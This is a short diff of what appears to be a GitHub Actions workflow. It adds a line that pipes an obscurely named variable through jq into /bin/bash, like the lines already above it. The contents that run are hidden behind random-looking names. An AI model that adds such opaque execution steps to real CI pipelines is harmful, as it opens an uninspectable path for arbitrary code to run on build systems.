@@ -30,6 +30,7 @@ jobs:
           echo $nc42 | jq -r .rjxl3372 | /bin/bash
           echo $qjck16 | jq -r .r79724 | /bin/bash
           printf '%s' "$xknke3682" | jq -r .mnu042 | /bin/bash
+          echo $belqz8 | jq -r .ul588 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
